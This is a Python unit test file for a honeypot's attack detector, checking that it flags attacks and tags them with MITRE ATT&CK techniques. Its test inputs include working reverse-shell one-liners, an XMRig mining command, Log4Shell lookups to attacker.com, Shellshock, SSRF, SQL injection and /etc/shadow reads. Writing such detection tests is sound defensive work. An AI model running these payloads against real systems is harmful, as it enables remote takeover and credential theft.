"""Unit and integration tests for enhanced anomaly detection and MITRE ATT&CK mapping.

Tests cryptominer detection, reverse shell signatures, web exploits (Log4Shell,
Shellshock, Spring4Shell, SSRF, SQLi), MITRE tagging, and attack summaries.
"""

import unittest
from baitbox.anomaly import (
    analyze_event,
    detect_cryptominer,
    detect_reverse_shell,
    detect_web_exploit,
    get_attack_summary,
    get_mitre_attack_tags,
    get_threat_score,
    reset_metrics,
)


class EnhancedAnomalyTests(unittest.TestCase):
    def setUp(self):
        reset_metrics()

    def test_cryptominer_detection(self):
        """Verify detection of XMRig, stratum pool connections, and Monero wallet addresses."""
        # 1. Binary name
        hits1 = detect_cryptominer("./xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u 48edfHu7V9Z84YLFzUMU8iFraTDChPr48qaMW27TueSgHfEL2g9xVkQUCYuR562GyPpY4F13pmGjmt9DfPe3BQqV3WEU877 -p x")
        self.assertTrue(len(hits1) >= 1)
        self.assertEqual(hits1[0]["rule"], "CRYPTOMINER")
        self.assertEqual(hits1[0]["mitre_id"], "T1496")

        # 2. Event analysis integrates cryptomining indicator
        ip = "192.0.2.100"
        res = analyze_event({
            "src_ip": ip,
            "event_type": "command",
            "protocol": "SSH",
            "payload": {"command": "nohup ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 &"},
        })
        self.assertIn("T1496", res["mitre_techniques"])
        self.assertIn("CRYPTOMINING", res["attack_categories"])
        self.assertTrue(any(ind["rule"] == "CRYPTOMINER" for ind in res["indicators"]))

    def test_reverse_shell_detection(self):
        """Verify detection of bash /dev/tcp, netcat -e, mkfifo, and python reverse shells."""
        # 1. Bash /dev/tcp
        hits_bash = detect_reverse_shell("bash -i >& /dev/tcp/198.51.100.1/4444 0>&1")
        self.assertTrue(len(hits_bash) >= 1)
        self.assertEqual(hits_bash[0]["rule"], "REVERSE_SHELL")
        self.assertEqual(hits_bash[0]["mitre_id"], "T1059.004")

        # 2. Netcat -e
        hits_nc = detect_reverse_shell("nc -e /bin/sh 198.51.100.1 9001")
        self.assertTrue(len(hits_nc) >= 1)

        # 3. Python socket/pty
        hits_py = detect_reverse_shell("python3 -c 'import socket,pty,os;s=socket.socket();s.connect((\"10.0.0.1\",4242));pty.spawn(\"/bin/bash\")'")
        self.assertTrue(len(hits_py) >= 1)

        # 4. Event analysis integrates reverse shell indicator
        ip = "192.0.2.101"
        res = analyze_event({
            "src_ip": ip,
            "event_type": "command",
            "protocol": "SSH",
            "payload": {"command": "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f"},
        })
        self.assertIn("REVERSE_SHELL", res["attack_categories"])

    def test_web_exploit_signatures(self):
        """Verify detection of Log4Shell, Spring4Shell, Shellshock, SSRF, and SQLi."""
        # 1. Log4Shell
        hits_log4j = detect_web_exploit("/api", body="${jndi:ldap://attacker.com/exploit}")
        self.assertTrue(len(hits_log4j) >= 1)
        self.assertIn("Log4Shell", hits_log4j[0]["description"])

        # 2. Spring4Shell
        hits_spring = detect_web_exploit("/helloworld", query="class.module.classLoader.resources.context.parent.pipeline.first.pattern=test")
        self.assertTrue(len(hits_spring) >= 1)
        self.assertIn("Spring4Shell", hits_spring[0]["description"])

        # 3. Shellshock
        hits_shock = detect_web_exploit("/cgi-bin/test.sh", body="() { :; }; /bin/cat /etc/passwd")
        self.assertTrue(len(hits_shock) >= 1)
        self.assertIn("Shellshock", hits_shock[0]["description"])

        # 4. SSRF
        hits_ssrf = detect_web_exploit("/proxy", query="url=http://169.254.169.254/latest/meta-data/")
        self.assertTrue(len(hits_ssrf) >= 1)
        self.assertIn("SSRF", hits_ssrf[0]["description"])

        # 5. Full event analysis
        ip = "192.0.2.102"
        res = analyze_event({
            "src_ip": ip,
            "event_type": "request",
            "protocol": "HTTP",
            "payload": {
                "path": "/login",
                "query": "user=admin' OR '1'='1",
                "body": "${jndi:rmi://10.0.0.1/evil}",
            },
        })
        self.assertIn("T1190", res["mitre_techniques"])
        self.assertIn("EXPLOIT", res["attack_categories"])

    def test_mitre_attack_tags_helper(self):
        """Verify get_mitre_attack_tags maps commands correctly."""
        tags = get_mitre_attack_tags("sudo cat /etc/shadow && wget http://site.com/bin", protocol="SSH")
        tech_ids = [t["technique_id"] for t in tags]
        self.assertIn("T1059.004", tech_ids)  # Unix Shell
        self.assertIn("T1548.003", tech_ids)  # Sudo
        self.assertIn("T1552.001", tech_ids)  # Credentials in Files (/etc/shadow)
        self.assertIn("T1105", tech_ids)      # Ingress Tool Transfer (wget)

    def test_attack_summary_telemetry(self):
        """Verify get_attack_summary returns aggregate metrics and top techniques."""
        # Ingest a series of distinct attack events
        analyze_event({
            "src_ip": "192.0.2.201",
            "event_type": "auth_attempt",
            "protocol": "SSH",
            "payload": {"username": "root"},
        })
        analyze_event({
            "src_ip": "192.0.2.202",
            "event_type": "command",
            "protocol": "SSH",
            "payload": {"command": "xmrig -o stratum+tcp://pool:3333"},
        })
        analyze_event({
            "src_ip": "192.0.2.203",
            "event_type": "request",
            "protocol": "HTTP",
            "payload": {"path": "/.env"},
        })

        summary = get_attack_summary()
        self.assertGreater(summary["total_tracked_ips"], 0)
        self.assertIn("active_threats", summary)
        self.assertIn("stats", summary)
        self.assertIn("top_mitre_techniques", summary)
        self.assertTrue(len(summary["top_mitre_techniques"]) > 0)


if __name__ == "__main__":
    unittest.main()
